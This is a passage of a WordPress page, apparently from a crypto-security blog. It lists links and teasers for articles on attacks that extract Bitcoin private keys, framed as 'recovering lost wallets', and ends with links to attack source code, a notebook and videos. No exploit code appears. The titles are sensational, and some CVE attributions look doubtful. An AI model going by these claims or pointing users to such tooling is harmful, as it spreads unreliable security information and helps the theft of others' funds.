<li><em><strong><a href="https://key3.ru/phantom-utxo-leak-attack-a-deanonymization-attack-on-the-bitcoin-ecosystem-via-the-nonwitnessutxo-leak-to-recover-private-keys-from-lost-cryptocurrency-wallets/">Phantom UTXO Leak Attack: A deanonymization attack on the Bitcoin ecosystem via the NonWitnessUtxo leak to recover private keys from lost cryptocurrency wallets</a> </strong>Phantom UTXO Leak Attack The Phantom UTXO Leak vulnerability in PSBT/BIP-174 demonstrates how a simple error in data field management can turn into a serious threat to the entire Bitcoin…<a href="https://key3.ru/phantom-utxo-leak-attack-a-deanonymization-attack-on-the-bitcoin-ecosystem-via-the-nonwitnessutxo-leak-to-recover-private-keys-from-lost-cryptocurrency-wallets/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/pem-bleed-attack-critical-ecdsa-private-key-leak-vulnerability-a-catastrophic-attack-on-the-bitcoin-ecosystems-cryptographic-foundation-and-methods-for-recovering-lost-wallets/">PEM-BLEED ATTACK: Critical ECDSA Private Key Leak Vulnerability – A Catastrophic Attack on the Bitcoin Ecosystem’s Cryptographic Foundation and Methods for Recovering Lost Wallets</a> </strong>PEM-BLEED — BTCSuite Private Key Leak Attack The essence of the attack PEM-BLEED (Privacy Enhanced Mail Bleed) is an attack that exploits the insecure serialization and transmission of ECDSA private keys in…<a href="https://key3.ru/pem-bleed-attack-critical-ecdsa-private-key-leak-vulnerability-a-catastrophic-attack-on-the-bitcoin-ecosystems-cryptographic-foundation-and-methods-for-recovering-lost-wallets/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/phantom-leak-a-critical-vulnerability-in-bitcoin-private-key-validation-and-the-threat-of-a-key-injection-attack-as-a-factor-in-the-theft-of-funds-and-the-undermining-of-the-integrity-of-the-blockcha/">Phantom Leak: A critical vulnerability in Bitcoin private key validation and the threat of a Key Injection Attack as a factor in the theft of funds and the undermining of the integrity of the blockchain</a> </strong>Phantom Leak Ignoring errors in Bitcoin’s private key processing creates a fundamental window for Key Injection attacks, which allow malicious private keys and addresses to be generated, injected, and exploited.…<a href="https://key3.ru/phantom-leak-a-critical-vulnerability-in-bitcoin-private-key-validation-and-the-threat-of-a-key-injection-attack-as-a-factor-in-the-theft-of-funds-and-the-undermining-of-the-integrity-of-the-blockcha/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/one-bit-master-attack-a-critical-cryptographic-vulnerability-in-bitcoin-one-bit-master-attack-and-private-key-recovery-via-hardcoded-private-key-attack-cve-2025-27840/">One-Bit Master Attack: A Critical Cryptographic Vulnerability in Bitcoin: One-Bit Master Attack and Private Key Recovery via Hardcoded Private Key Attack (CVE-2025-27840)</a> </strong>One-Bit Master Attack The cryptographic vulnerability associated with the use of a hardcoded private key ( btcec.PrivKeyFromBytes([]byte{0x01})) represents an extremely dangerous and systemic security flaw in the Bitcoin infrastructure, potentially leading…<a href="https://key3.ru/one-bit-master-attack-a-critical-cryptographic-vulnerability-in-bitcoin-one-bit-master-attack-and-private-key-recovery-via-hardcoded-private-key-attack-cve-2025-27840/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/key-ghost-attack-memory-ghosts-and-the-threat-of-bitcoin-private-key-extraction-via-cold-boot-and-memory-extraction-attacks-allow-an-attacker-to-gain-full-access-to-btc-coins/">Key Ghost Attack: Memory ghosts and the threat of Bitcoin private key extraction via cold boot and memory extraction attacks allow an attacker to gain full access to BTC coins.</a> </strong>Key Ghost Attack Insufficient attention to zeroization in cryptographic libraries poses a serious security risk to the entire Bitcoin and other cryptocurrency ecosystems. Cold Boot Attacks and Memory Key Extraction can lead to complete…<a href="https://key3.ru/key-ghost-attack-memory-ghosts-and-the-threat-of-bitcoin-private-key-extraction-via-cold-boot-and-memory-extraction-attacks-allow-an-attacker-to-gain-full-access-to-btc-coins/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/singleton-stampede-a-critical-race-in-the-context-of-secp256k1-leading-to-private-key-recovery-and-an-all-out-attack-on-bitcoin-wallets-the-vulnerability-threatens-bitcoins-cryptosecurity-and-ope/">Singleton Stampede: A critical race in the context of secp256k1, leading to private key recovery and an all-out attack on Bitcoin wallets. The vulnerability threatens Bitcoin’s cryptosecurity and opens the door to an all-out attack on digital assets.</a> </strong>Singleton Stampede A cryptographic vulnerability related to incorrect multi-threaded initialization of the singleton context for secp256k1 in Bitcoin software is one of the most dangerous design flaws in the distributed…<a href="https://key3.ru/singleton-stampede-a-critical-race-in-the-context-of-secp256k1-leading-to-private-key-recovery-and-an-all-out-attack-on-bitcoin-wallets-the-vulnerability-threatens-bitcoins-cryptosecurity-and-ope/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/context-phantom-attack-critical-secp256k1-phantom-context-leak-vulnerability-and-recovery-of-lost-bitcoin-wallet-private-keys-via-memory-disclosure-attack/">Context Phantom Attack: Critical secp256k1 phantom context leak vulnerability and recovery of lost Bitcoin wallet private keys via memory disclosure attack</a> </strong>Context Phantom Attack (Ghost Attack of Context) The Context Phantom Memory Disclosure Attack (CPMA) poses a critical security threat to the Bitcoin network. Failure to sanitize secp256k1 contexts allows for mass extraction of…<a href="https://key3.ru/context-phantom-attack-critical-secp256k1-phantom-context-leak-vulnerability-and-recovery-of-lost-bitcoin-wallet-private-keys-via-memory-disclosure-attack/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/chronoshock-vulnerability-critical-private-key-generation-vulnerability-and-milk-sad-attack-cve-2023-39910-private-key-recovery-for-lost-bitcoin-wallets-mass-compromise-and-mortal-threa/">ChronoShock Vulnerability: Critical Private Key Generation Vulnerability and Milk Sad Attack (CVE-2023-39910) – Private key recovery for lost Bitcoin wallets, mass compromise, and mortal threat to the Bitcoin cryptocurrency ecosystem</a> </strong>ChronoShock Vulnerability Neglecting the principles of strong entropy generation leads to disastrous consequences for users of cryptographic and especially blockchain applications. The classic «ChronoShock» (Milk Sad) vulnerability demonstrated that even…<a href="https://key3.ru/chronoshock-vulnerability-critical-private-key-generation-vulnerability-and-milk-sad-attack-cve-2023-39910-private-key-recovery-for-lost-bitcoin-wallets-mass-compromise-and-mortal-threa/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/spectral-fingerprint-attack-a-critical-memory-remnant-vulnerability-and-a-dangerous-attack-for-recovering-private-keys-from-data-leaks-can-persist-secrets-in-ram-without-hard-sanitization/">Spectral Fingerprint Attack: A critical memory remnant vulnerability and a dangerous attack for recovering private keys from data leaks can persist secrets in RAM without hard sanitization.</a> </strong>Spectral Fingerprint Attack (Remanence Attack) The vulnerability is related to a spectral fingerprinting attack, which occurs due to careless memory handling when handling private keys. It can be completely mitigated…<a href="https://key3.ru/spectral-fingerprint-attack-a-critical-memory-remnant-vulnerability-and-a-dangerous-attack-for-recovering-private-keys-from-data-leaks-can-persist-secrets-in-ram-without-hard-sanitization/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/ringside-replay-attack-milk-sad-cve-2023-39910-recovering-private-keys-of-lost-bitcoin-wallets-by-exploiting-a-critical-weak-entropy-vulnerability-in-the-pseudorandom-number-generator/">RingSide Replay Attack (Milk Sad CVE-2023-39910): Recovering private keys of lost Bitcoin wallets by exploiting a critical weak entropy vulnerability in the pseudorandom number generator</a> </strong>RingSide Replay Attack – A Spectacular Hack Based on Weak Entropy The RingSide Replay Attack (Milk Sad CVE-2023-39910) is a textbook example of how flaws in the entropy source can…<a href="https://key3.ru/ringside-replay-attack-milk-sad-cve-2023-39910-recovering-private-keys-of-lost-bitcoin-wallets-by-exploiting-a-critical-weak-entropy-vulnerability-in-the-pseudorandom-number-generator/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://key3.ru/hexwitness-leak-a-critical-vulnerability-leaking-private-keys-through-the-witness-stack-is-a-deadly-threat-to-the-bitcoin-network-where-an-attacker-can-simply-trace-a-log-or-memory-dump-to-gain-comp/"><strong>HexWitness Leak: A critical vulnerability leaking private keys through the witness stack is a deadly threat to the Bitcoin network, where an attacker can simply trace a log or memory dump to gain complete control over someone else’s BTC.</strong></a> HexWitness Leak (Secret Key Leakage) Critical serialization and data output errors leading to accidental or intentional leakage of private keys pose a mortal threat to both individual users and the…<a href="https://key3.ru/hexwitness-leak-a-critical-vulnerability-leaking-private-keys-through-the-witness-stack-is-a-deadly-threat-to-the-bitcoin-network-where-an-attacker-can-simply-trace-a-log-or-memory-dump-to-gain-comp/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://key3.ru/hash-race-poison-attack-a-devastating-attack-on-digital-signature-infrastructure-including-private-key-recovery-for-lost-bitcoin-wallets-where-the-attacker-injects-their-own-values/"><strong>Hash Race Poison Attack: A devastating attack on digital signature infrastructure, including private key recovery for lost Bitcoin wallets, where the attacker injects their own values ​​into the signature, potentially leaking private keys.</strong></a> Hash Race Poison Attack A critical vulnerability arising from the lack of thread safety in the caching of cryptographic hashes in Bitcoin’s transaction signing infrastructure opens the door to one…<a href="https://key3.ru/hash-race-poison-attack-a-devastating-attack-on-digital-signature-infrastructure-including-private-key-recovery-for-lost-bitcoin-wallets-where-the-attacker-injects-their-own-values/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/bitcoin-golden-onehash-heist-recovering-lost-bitcoin-wallets-using-cve-2025-29774-where-an-attacker-signs-a-transaction-without-having-the-private-key-effectively-making-the-bitcoin-system/">Bitcoin Golden Onehash Heist: Recovering lost Bitcoin wallets using (CVE-2025-29774) where an attacker signs a transaction without having the private key—effectively making the Bitcoin system unable to distinguish between the true owner of Bitcoin funds and the attacker.</a> </strong>Bitcoin Golden Onehash Heist ( Digital Signature Forgery Attack —  CVE-2025-29774 ) The critical vulnerability in the SIGHASH_SINGLE flag handling discussed above opens the door to one of the most devastating attacks on the…<a href="https://key3.ru/bitcoin-golden-onehash-heist-recovering-lost-bitcoin-wallets-using-cve-2025-29774-where-an-attacker-signs-a-transaction-without-having-the-private-key-effectively-making-the-bitcoin-system/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/bloodprint-attack-is-a-devastating-vulnerability-that-leaks-private-keys-from-bitcoin-wallets-and-methods-for-recovering-them-the-vulnerability-gives-an-attacker-absolute-control-to-legitimately-sign/">Bloodprint Attack is a devastating vulnerability that leaks private keys from Bitcoin wallets and methods for recovering them. The vulnerability gives an attacker absolute control to legitimately sign any transactions and permanently withdraw all BTC funds.</a> </strong>Bloodprint Attack (Secret Key Leakage Attack) A critical cryptographic vulnerability involving private key leakage from memory leads to attacks known in scientific literature as «Secret Key Leakage Attacks» or «Key…<a href="https://key3.ru/bloodprint-attack-is-a-devastating-vulnerability-that-leaks-private-keys-from-bitcoin-wallets-and-methods-for-recovering-them-the-vulnerability-gives-an-attacker-absolute-control-to-legitimately-sign/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/streamleak-attack-total-compromise-of-bitcoin-assets-through-scientific-analysis-of-private-key-recovery-from-vulnerable-logging-systems-attackers-withdraw-funds-and-destroy-digital-property-without/">STREAMLEAK ATTACK: Total compromise of Bitcoin assets through scientific analysis of private key recovery from vulnerable logging systems. Attackers withdraw funds and destroy digital property without the owner’s knowledge.</a> </strong>STREAMLEAK ATTACK ( Private Key Compromise Attack )  is a method of extracting cryptographic secrets through abuse of an overloaded operator  &lt;&lt; in C++. A critical vulnerability in the serialization and output of private keys could…<a href="https://key3.ru/streamleak-attack-total-compromise-of-bitcoin-assets-through-scientific-analysis-of-private-key-recovery-from-vulnerable-logging-systems-attackers-withdraw-funds-and-destroy-digital-property-without/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/oracle-whisper-attack-a-critical-base58-decoding-secret-leak-vulnerability-threatens-bitcoin-wallet-private-key-extraction-where-an-attacker-steals-secret-key-bits-from-the-i-o-library/">Oracle Whisper Attack: A critical Base58 decoding secret leak vulnerability threatens Bitcoin wallet private key extraction, where an attacker steals secret key bits from the I/O library.</a> </strong>Oracle Whisper Attack ( Private Key Compromise Attack ) Attack Description:When processing a Base58 string containing a private key, the attacker injects an «oracle»—a thin agent in the I/O library that whispers…<a href="https://key3.ru/oracle-whisper-attack-a-critical-base58-decoding-secret-leak-vulnerability-threatens-bitcoin-wallet-private-key-extraction-where-an-attacker-steals-secret-key-bits-from-the-i-o-library/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/hex-dump-reveal-attack-and-private-key-recovery-for-lost-bitcoin-wallets-where-an-attacker-uses-logging-of-secret-data-to-reveal-a-hexadecimal-dump-hex-dump-reveal-containing-btc-coins/">Hex Dump Reveal Attack and private key recovery for lost Bitcoin wallets, where an attacker uses logging of secret data to reveal a hexadecimal dump (Hex Dump Reveal) containing BTC coins</a> </strong>Hex Dump Reveal Attack ( «Key Disclosure Attack», «Secret Key Leakage Attack», «Key Recovery Attack». CVE-2025-29774 and CWE-532 ) «Hex Dump Reveal»  — «Hexadecimal dump disclosure». Vulnerabilities in the logging of private data,…<a href="https://key3.ru/hex-dump-reveal-attack-and-private-key-recovery-for-lost-bitcoin-wallets-where-an-attacker-uses-logging-of-secret-data-to-reveal-a-hexadecimal-dump-hex-dump-reveal-containing-btc-coins/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://key3.ru/secret-capsule-attack-recovering-bitcoin-wallet-private-keys-through-a-vulnerability-and-mass-compromise-of-bitcoin-wallets-where-an-attacker-creates-predictable-entropy-in-mersenne-twister-generato/"><strong>Secret Capsule Attack: Recovering Bitcoin wallet private keys through a vulnerability and mass compromise of Bitcoin wallets, where an attacker creates predictable entropy in Mersenne Twister generators, there are real thefts of user funds in the amount of over $900,000</strong></a> SECRET CAPSULE ATTACK (Predictable PRNG Seed Attack) The critical «Milk Sad» vulnerability (CVE-2023-39910), discovered in Libbitcoin Explorer’s entropy generation mechanism, clearly demonstrated how a single flaw in the randomness source…<a href="https://key3.ru/secret-capsule-attack-recovering-bitcoin-wallet-private-keys-through-a-vulnerability-and-mass-compromise-of-bitcoin-wallets-where-an-attacker-creates-predictable-entropy-in-mersenne-twister-generato/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/key-fountain-attack-turning-a-buffer-overflow-into-a-tool-for-btc-theft-and-private-key-recovery-in-the-bitcoin-ecosystem-where-an-attacker-gains-the-ability-to-extract-or-replace-bitcoin-wallet-sec/">Key Fountain Attack: Turning a Buffer Overflow into a Tool for BTC Theft and Private Key Recovery in the Bitcoin Ecosystem, where an Attacker Gains the Ability to Extract or Replace Bitcoin Wallet Secrets</a> </strong>Key Fountain Attack ( Heap-based Buffer Overflow ) The attacker prepares input data—specially formed fragments for the libbitcoin library’s splice or build_chunk functions—that exceed the allocated buffer size. For example, the transmitted…<a href="https://key3.ru/key-fountain-attack-turning-a-buffer-overflow-into-a-tool-for-btc-theft-and-private-key-recovery-in-the-bitcoin-ecosystem-where-an-attacker-gains-the-ability-to-extract-or-replace-bitcoin-wallet-sec/">Read More</a></em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-3.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeeptech.ru/">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and elliptic curve cryptography&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech">(secp256k1) against weak&nbsp;</a><a href="https://github.com/demining/CryptoDeepTools">ECDSA</a>&nbsp;&nbsp;signatures&nbsp;&nbsp;&nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech">BITCOIN</a>&nbsp;cryptocurrency . The software developers are not responsible for the use of this material.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptou.ru/vulncipher/">Crypto Tools</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/49ChronoforgeAttack">Source code</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery">Google Colab</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech">Telegram: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/owgbAd-vtoI">Video: https://youtu.be/owgbAd-vtoI</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a">Video tutorial: https://dzen.ru/video/watch/69b1a59cde2c2b0c75836b1a</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeeptech.ru/chronoforge-attack">Source: https://cryptodeeptech.ru/chronoforge-attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/072-1-1024x576.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/072-1-1024x576.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->